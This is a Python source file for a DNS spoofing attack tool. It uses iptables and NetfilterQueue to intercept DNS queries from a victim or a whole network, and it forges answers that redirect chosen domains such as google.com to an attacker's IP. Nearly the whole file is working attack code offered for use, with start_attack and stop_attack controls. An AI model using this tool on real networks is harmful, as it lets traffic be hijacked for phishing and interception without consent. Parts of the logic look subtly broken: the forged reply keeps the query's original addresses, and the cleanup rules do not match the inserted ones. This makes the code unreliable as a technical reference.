"""
DNS Spoofing using NetfilterQueue
Intercepts DNS packets at kernel level and modifies responses in-place.

This approach is much more reliable than running a DNS server because:
1. Uses NFQUEUE to intercept packets before they reach legitimate DNS
2. Modifies DNS responses in transit
3. Works without binding to port 53
"""

import sys
import threading
import time
import subprocess
import os
from pathlib import Path
from typing import Optional, List

sys.path.append(str(Path(__file__).parent.parent))

from utils.logger import get_logger

try:
    from scapy.all import IP, UDP, DNS, DNSQR, DNSRR
    from netfilterqueue import NetfilterQueue
    HAS_NFQUEUE = True
except ImportError:
    HAS_NFQUEUE = False


class DNSSpooferNFQueue:
    """
    DNS Spoofing using NetfilterQueue to intercept and modify DNS packets.
    
    REQUIRES:
    - sudo python3 app.py
    - netfilterqueue installed: pip install NetfilterQueue
    - iptables
    """
    
    def __init__(
        self,
        attacker_ip: str,
        target_domains: Optional[List[str]] = None,
        victim_ip: Optional[str] = None,
        queue_num: int = 0
    ):
        """
        Initialize DNS Spoofer with NetfilterQueue
        
        Args:
            attacker_ip: IP to redirect domains to
            target_domains: List of domains to spoof
            victim_ip: Optional specific victim IP
            queue_num: NetfilterQueue number (0-65535)
        """
        if not HAS_NFQUEUE:
            raise ImportError("NetfilterQueue not installed. Run: pip install NetfilterQueue")
        
        self.attacker_ip = attacker_ip
        self.target_domains = set(d.lower().rstrip('.').encode() for d in (target_domains or ["google.com"]))
        self.victim_ip = victim_ip
        self.queue_num = queue_num
        
        self.logger = get_logger("DNSSpoofNFQ")
        self.is_running = False
        self.queue_thread: Optional[threading.Thread] = None
        self.nfqueue: Optional[NetfilterQueue] = None
        self.packets_spoofed = 0
        self.start_time = None
        self.iptables_rule_added = False
        
        target_str = f"victim={victim_ip}" if victim_ip else "network-wide"
        self.logger.info(
            f"DNSSpoofNFQ initialized: {attacker_ip}, "
            f"domains={[d.decode() for d in self.target_domains]}, {target_str}"
        )
    
    def _setup_iptables(self):
        """Setup iptables to forward DNS traffic to NFQUEUE"""
        try:
            # Clear any existing rules
            subprocess.run(
                ["sudo", "iptables", "-D", "FORWARD", "-j", "NFQUEUE", "--queue-num", str(self.queue_num)],
                capture_output=True, timeout=2
            )
            
            # Add rule to redirect DNS traffic to our queue (both INPUT and FORWARD chains)
            if self.victim_ip:
                # Only from specific victim - add to both chains
                subprocess.run(
                    ["sudo", "iptables", "-I", "INPUT",
                     "-s", self.victim_ip, "-p", "udp", "--dport", "53",
                     "-j", "NFQUEUE", "--queue-num", str(self.queue_num)],
                    capture_output=True, timeout=5, text=True
                )
                cmd = [
                    "sudo", "iptables", "-I", "FORWARD",
                    "-s", self.victim_ip,
                    "-p", "udp", "--dport", "53",
                    "-j", "NFQUEUE", "--queue-num", str(self.queue_num)
                ]
            else:
                # From all sources - both chains
                subprocess.run(
                    ["sudo", "iptables", "-I", "INPUT",
                     "-p", "udp", "--dport", "53",
                     "-j", "NFQUEUE", "--queue-num", str(self.queue_num)],
                    capture_output=True, timeout=5, text=True
                )
                cmd = [
                    "sudo", "iptables", "-I", "FORWARD",
                    "-p", "udp", "--dport", "53",
                    "-j", "NFQUEUE", "--queue-num", str(self.queue_num)
                ]
            
            result = subprocess.run(cmd, capture_output=True, timeout=5, text=True)
            
            if result.returncode == 0:
                self.logger.info(f"✅ iptables: DNS traffic → NFQUEUE {self.queue_num}")
                self.iptables_rule_added = True
                return True
            else:
                self.logger.error(f"❌ iptables failed: {result.stderr}")
                return False
        except Exception as e:
            self.logger.error(f"❌ iptables error: {e}")
            return False
    
    def _cleanup_iptables(self):
        """Remove iptables rules from both chains"""
        if not self.iptables_rule_added:
            return
        
        try:
            # Remove from INPUT chain
            subprocess.run(
                ["sudo", "iptables", "-D", "INPUT", "-j", "NFQUEUE", "--queue-num", str(self.queue_num)],
                capture_output=True, timeout=5
            )
            # Remove from FORWARD chain
            subprocess.run(
                ["sudo", "iptables", "-D", "FORWARD", "-j", "NFQUEUE", "--queue-num", str(self.queue_num)],
                capture_output=True, timeout=5
            )
            self.logger.info("✅ iptables rules removed")
            self.iptables_rule_added = False
        except Exception as e:
            self.logger.error(f"Error removing iptables: {e}")
    
    def _process_packet(self, packet):
        """Process packets from NetfilterQueue"""
        try:
            # Convert to Scapy packet
            scapy_packet = IP(packet.get_payload())
            
            # Check if it has DNS layer
            if scapy_packet.haslayer(DNS):
                dns_layer = scapy_packet[DNS]
                
                # Check if it's a DNS query (qr=0)
                if dns_layer.qr == 0 and dns_layer.qd:
                    qname = dns_layer.qd.qname
                    
                    # Check if domain matches our targets
                    if self._is_target_domain(qname):
                        source_ip = scapy_packet[IP].src
                        
                        # Check victim IP if specified
                        if self.victim_ip and source_ip != self.victim_ip:
                            packet.accept()
                            return
                        
                        self.logger.info(f"🎯 Intercepting DNS query from {source_ip} for {qname.decode()}")
                        
                        # Modify packet to add spoofed response
                        scapy_packet = self._modify_packet(scapy_packet, qname)
                        
                        if scapy_packet:
                            # Set modified packet back
                            packet.set_payload(bytes(scapy_packet))
                            self.packets_spoofed += 1
                            self.logger.info(f"✅ SPOOFED: {qname.decode()} → {self.attacker_ip}")
            
            packet.accept()
            
        except Exception as e:
            self.logger.error(f"Error processing packet: {e}")
            packet.accept()
    
    def _is_target_domain(self, qname: bytes) -> bool:
        """Check if domain should be spoofed"""
        qname = qname.lower().rstrip(b'.')
        for target in self.target_domains:
            if qname == target or qname.endswith(b'.' + target):
                return True
        return False
    
    def _modify_packet(self, packet, qname: bytes):
        """Modify DNS packet to add fake response"""
        try:
            # Create fake DNS response
            packet[DNS].qr = 1  # Response
            packet[DNS].aa = 1  # Authoritative
            packet[DNS].ancount = 1  # 1 answer
            
            # Add answer record
            packet[DNS].an = DNSRR(
                rrname=qname,
                type=1,  # A record
                rclass=1,  # IN
                ttl=0,  # Immediate expiration
                rdata=self.attacker_ip
            )
            
            # Recalculate checksums
            del packet[IP].len
            del packet[IP].chksum
            del packet[UDP].len
            del packet[UDP].chksum
            
            return packet
            
        except Exception as e:
            self.logger.error(f"Error modifying packet: {e}")
            return None
    
    def _queue_thread_func(self):
        """Thread function to run NetfilterQueue"""
        try:
            self.nfqueue = NetfilterQueue()
            self.nfqueue.bind(self.queue_num, self._process_packet)
            
            self.logger.info(f"🚀 NetfilterQueue running on queue {self.queue_num}")
            self.nfqueue.run()
            
        except Exception as e:
            self.logger.error(f"❌ NetfilterQueue error: {e}")
            self.is_running = False
        finally:
            if self.nfqueue:
                try:
                    self.nfqueue.unbind()
                except:
                    pass
            self.logger.info("NetfilterQueue stopped")
    
    def start_attack(self):
        """Start DNS spoofing"""
        if self.is_running:
            self.logger.warning("Attack already running")
            return False
        
        self.is_running = True
        self.packets_spoofed = 0
        self.start_time = time.time()
        
        # Setup iptables
        if not self._setup_iptables():
            self.logger.error("Failed to setup iptables")
            self.is_running = False
            return False
        
        # Start queue thread
        self.queue_thread = threading.Thread(
            target=self._queue_thread_func,
            daemon=True,
            name="DNSSpoofNFQ-Queue"
        )
        self.queue_thread.start()
        
        self.logger.info(f"🚀 DNS Spoofing started with NetfilterQueue")
        return True
    
    def stop_attack(self):
        """Stop DNS spoofing"""
        if not self.is_running:
            return False
        
        self.is_running = False
        
        # Unbind queue
        if self.nfqueue:
            try:
                self.nfqueue.unbind()
            except:
                pass
        
        # Wait for thread
        if self.queue_thread and self.queue_thread.is_alive():
            self.queue_thread.join(timeout=2)
        
        # Cleanup iptables
        self._cleanup_iptables()
        
        duration = time.time() - self.start_time if self.start_time else 0
        self.logger.info(
            f"🛑 DNS Spoofing stopped | "
            f"Duration: {duration:.1f}s | "
            f"Packets spoofed: {self.packets_spoofed}"
        )
        
        return True
    
    def get_status(self) -> dict:
        """Get attack status"""
        return {
            "is_running": self.is_running,
            "attacker_ip": self.attacker_ip,
            "target_domains": [d.decode() for d in self.target_domains],
            "packets_spoofed": self.packets_spoofed,
            "start_time": self.start_time,
        }
